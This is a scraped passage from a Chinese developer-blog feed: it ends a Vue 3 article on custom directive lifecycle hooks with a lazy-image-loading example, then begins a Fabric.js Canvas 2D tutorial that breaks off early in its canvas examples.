  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// 初始化</span>
    el.<span class="hljs-property">_lazyLoadObserver</span> = <span class="hljs-literal">null</span>
    el.<span class="hljs-property">_lazyLoadSrc</span> = binding.<span class="hljs-property">value</span>
    el.<span class="hljs-property">_lazyLoadOptions</span> = {
      <span class="hljs-attr">root</span>: <span class="hljs-literal">null</span>,
      <span class="hljs-attr">rootMargin</span>: <span class="hljs-string">'50px'</span>,
      <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.1</span>,
      ...(<span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'object'</span> ? binding.<span class="hljs-property">value</span>.<span class="hljs-property">options</span> : {})
    }
  },
  
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// 设置占位符</span>
    <span class="hljs-keyword">const</span> placeholder = el.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-src'</span>) || <span class="hljs-string">'/placeholder.jpg'</span>
    el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'src'</span>, placeholder)
    
    <span class="hljs-comment">// 获取真实图片地址</span>
    <span class="hljs-keyword">const</span> src = <span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'string'</span> 
      ? binding.<span class="hljs-property">value</span> 
      : binding.<span class="hljs-property">value</span>.<span class="hljs-property">src</span>
    
    <span class="hljs-comment">// 如果图片已经在视窗内，直接加载</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isElementInViewport</span>(el)) {
      <span class="hljs-title function_">loadImage</span>(el, src)
      <span class="hljs-keyword">return</span>
    }
    
    <span class="hljs-comment">// 使用 IntersectionObserver 懒加载</span>
    <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(<span class="hljs-function">(<span class="hljs-params">entries</span>) =&gt;</span> {
      entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">isIntersecting</span>) {
          <span class="hljs-title function_">loadImage</span>(el, src)
          observer.<span class="hljs-title function_">unobserve</span>(el)
        }
      })
    }, el.<span class="hljs-property">_lazyLoadOptions</span>)
    
    observer.<span class="hljs-title function_">observe</span>(el)
    el.<span class="hljs-property">_lazyLoadObserver</span> = observer
  },
  
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    <span class="hljs-comment">// 如果图片地址变化</span>
    <span class="hljs-keyword">const</span> newSrc = <span class="hljs-keyword">typeof</span> binding.<span class="hljs-property">value</span> === <span class="hljs-string">'string'</span> 
      ? binding.<span class="hljs-property">value</span> 
      : binding.<span class="hljs-property">value</span>.<span class="hljs-property">src</span>
    
    <span class="hljs-keyword">if</span> (newSrc !== el.<span class="hljs-property">_lazyLoadSrc</span>) {
      <span class="hljs-comment">// 停止观察</span>
      <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_lazyLoadObserver</span>) {
        el.<span class="hljs-property">_lazyLoadObserver</span>.<span class="hljs-title function_">unobserve</span>(el)
        el.<span class="hljs-property">_lazyLoadObserver</span> = <span class="hljs-literal">null</span>
      }
      
      <span class="hljs-comment">// 重新设置</span>
      el.<span class="hljs-property">_lazyLoadSrc</span> = newSrc
      
      <span class="hljs-comment">// 如果已经在视窗内，直接加载</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isElementInViewport</span>(el)) {
        <span class="hljs-title function_">loadImage</span>(el, newSrc)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 重新观察</span>
        <span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(<span class="hljs-function">(<span class="hljs-params">entries</span>) =&gt;</span> {
          entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
            <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">isIntersecting</span>) {
              <span class="hljs-title function_">loadImage</span>(el, newSrc)
              observer.<span class="hljs-title function_">unobserve</span>(el)
            }
          })
        }, el.<span class="hljs-property">_lazyLoadOptions</span>)
        
        observer.<span class="hljs-title function_">observe</span>(el)
        el.<span class="hljs-property">_lazyLoadObserver</span> = observer
      }
    }
  },
  
  <span class="hljs-title function_">beforeUnmount</span>(<span class="hljs-params">el</span>) {
    <span class="hljs-comment">// 清理 IntersectionObserver</span>
    <span class="hljs-keyword">if</span> (el.<span class="hljs-property">_lazyLoadObserver</span>) {
      el.<span class="hljs-property">_lazyLoadObserver</span>.<span class="hljs-title function_">unobserve</span>(el)
      el.<span class="hljs-property">_lazyLoadObserver</span> = <span class="hljs-literal">null</span>
    }
  }
}

<span class="hljs-comment">// 工具函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isElementInViewport</span>(<span class="hljs-params">el</span>) {
  <span class="hljs-keyword">const</span> rect = el.<span class="hljs-title function_">getBoundingClientRect</span>()
  <span class="hljs-keyword">return</span> (
    rect.<span class="hljs-property">top</span> &lt;= (<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientHeight</span>) &amp;&amp;
    rect.<span class="hljs-property">left</span> &lt;= (<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientWidth</span>) &amp;&amp;
    rect.<span class="hljs-property">bottom</span> &gt;= <span class="hljs-number">0</span> &amp;&amp;
    rect.<span class="hljs-property">right</span> &gt;= <span class="hljs-number">0</span>
  )
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">loadImage</span>(<span class="hljs-params">el, src</span>) {
  <span class="hljs-keyword">const</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>()
  
  img.<span class="hljs-property">onload</span> = <span class="hljs-function">() =&gt;</span> {
    el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'src'</span>, src)
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'loaded'</span>)
    
    <span class="hljs-comment">// 触发加载完成事件</span>
    el.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'lazyloaded'</span>, {
      <span class="hljs-attr">detail</span>: { src, <span class="hljs-attr">element</span>: el }
    }))
  }
  
  img.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`图片加载失败: <span class="hljs-subst">${src}</span>`</span>)
    el.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'error'</span>)
    
    <span class="hljs-comment">// 触发错误事件</span>
    el.<span class="hljs-title function_">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'lazyloaderror'</span>, {
      <span class="hljs-attr">detail</span>: { src, <span class="hljs-attr">element</span>: el }
    }))
  }
  
  img.<span class="hljs-property">src</span> = src
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-comment">// &lt;img v-lazy-load="'/images/picture.jpg'"&gt;</span>
<span class="hljs-comment">// &lt;img v-lazy-load="{ src: '/images/picture.jpg', options: { rootMargin: '100px' } }"&gt;</span>
</code></pre>
<p><strong>核心要点：</strong></p>
<ol>
<li><strong>Vue 3 指令有 6 个生命周期钩子</strong>：beforeMount、mounted、beforeUpdate、updated、beforeUnmount、unmounted</li>
<li><strong>正确选择钩子</strong>：根据操作类型选择合适的时间点</li>
<li><strong>资源管理</strong>：在卸载钩子中清理事件监听、定时器、观察器等</li>
<li><strong>性能优化</strong>：合理使用防抖、节流、事件委托</li>
<li><strong>错误处理</strong>：增强指令的健壮性</li>
</ol>
<p>掌握指令生命周期钩子，你可以创建强大、可复用、高性能的自定义指令，极大地扩展 Vue 的能力边界！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[案例+图解带你遨游 Canvas 2D绘图 Fabric.js🔥🔥（5W+字）]]></title>    <link>https://juejin.cn/post/7595351120668672026</link>    <guid>https://juejin.cn/post/7595351120668672026</guid>    <pubDate>2026-01-15T09:17:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595351120668672026" data-draft-id="7595351120668164122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="案例+图解带你遨游 Canvas 2D绘图 Fabric.js🔥🔥（5W+字）"/> <meta itemprop="keywords" content="前端,Canvas,JavaScript"/> <meta itemprop="datePublished" content="2026-01-15T09:17:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lsx_"/> <meta itemprop="url" content="https://juejin.cn/user/1442981392682829"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            案例+图解带你遨游 Canvas 2D绘图 Fabric.js🔥🔥（5W+字）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442981392682829/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lsx_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T09:17:12.000Z" title="Thu Jan 15 2026 09:17:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读24分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"☂"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"✓"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"➤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Fabric.js 简介</h2>
<blockquote>
<p><code>Fabric.js</code> 是一个功能强大且操作简单的 <code>Javascript HTML5 canvas</code> 工具库。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ed9714af1e54822927b09e08e63d853~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=ZjvpcCjGo7v5Lrdi1RHzEvT%2Fp8w%3D" alt="00.png" loading="lazy"/></p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Ffabricjs.com%2F" title="https://link.juejin.cn?target=http%3A%2F%2Ffabricjs.com%2F" target="_blank">『Fabric.js 官网首页』</a></p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Ffabricjs.com%2Fdemos%2F" title="https://link.juejin.cn?target=http%3A%2F%2Ffabricjs.com%2Fdemos%2F" target="_blank">『Fabric.js Demos』</a></p>
<p>本文主要讲解 <code>Fabric.js</code> <strong>有基础也有实战</strong>，包括：</p>
<ul>
<li>画布的基本操作</li>
<li>基础图形绘制方法（矩形、圆形、三角形、椭圆、多边形、线段等）</li>
<li>自定义图形</li>
<li>图片的使用</li>
<li>文本和文本框</li>
<li>图形和文本的基础样式</li>
<li>渐变</li>
<li>选中状态</li>
<li>分组和取消分组</li>
<li>动画</li>
<li>设置和获取图形层级</li>
<li>基础事件</li>
<li>禁止水平、垂直移动</li>
<li>缩放和平移画布</li>
<li>视口坐标和画布坐标转换</li>
<li>序列化和反序列化</li>
<li>……</li>
</ul>
<h2 data-id="heading-1">起步</h2>
<h3 data-id="heading-2">1. 新建页面并引入 Fabric.js</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>
</code></pre>
<h3 data-id="heading-3">2. 创建 canvas 容器</h3>
<p>在 <code>HTML</code> 中创建 <code>&lt;canvas&gt;</code>，并设置容器的 <code>id</code> 和 <code>宽高，width/height</code></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"c"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
</code></pre>
<p>这里创建了一个 <code>canvas</code> 容器，边框为灰色，<strong>id="c"</strong> 。指定长宽都为 <code>400px</code>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04a7df54dfbd4f29be0ce4cc2c28f037~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=eTbb6ID%2BlCpnSycO2bI5C7dTFSE%3D" alt="003.png" loading="lazy"/></p>
<h3 data-id="heading-4">3. 使用 fabric 接管容器，并画一个矩形</h3>
<p>在 <code>JS</code> 中实例化 <code>fabric</code> ，之后就可以使用 <code>fabric</code> 的 <code>api</code> 管理 <code>canvas</code> 了。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span> <span class="hljs-comment">// 引入 fabric</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'c'</span>) <span class="hljs-comment">// 这里传入的是canvas的id</span>

  <span class="hljs-comment">// 创建一个长方形</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// 距离容器顶部 30px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// 距离容器左侧 30px</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 宽 100px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">60</span>, <span class="hljs-comment">// 高 60px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span> <span class="hljs-comment">// 填充 红色</span>
  })

  <span class="hljs-comment">// 在canvas画布中加入矩形（rect）。</span>
  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1bb2f6f0a9246329f7673fdcbbca3f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=fwPGXqvRwYtkI77G0FHJRjKahAE%3D" alt="004.png" loading="lazy"/></p>
<h2 data-id="heading-5">画布</h2>
<p><code>Fabric.js</code> 的画布操作性是非常强的。</p>
<h3 data-id="heading-6">基础版（可交互）</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9050918565bc407f9467853593f13635~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=8cdzf1QrmeID7RpsGFACjH0SxWQ%3D" alt="005.gif" loading="lazy"/></p>
<p>基础版就是“起步”章节所说的那个例子。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>) <span class="hljs-comment">// 这里传入的是canvas元素的id</span>

  <span class="hljs-comment">// 创建一个长方形</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 距离容器顶部 100px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 距离容器左侧 100px</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// 矩形宽度 30px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// 矩形高度 30px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span> <span class="hljs-comment">// 填充 红色</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect) <span class="hljs-comment">// 将矩形添加到 canvas 画布里</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">不可交互</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34fe710596b64103ab942a542f37f99a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=XlmMmq5k69jOPDhZ6N4CYRb%2FCvY%3D" alt="006.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
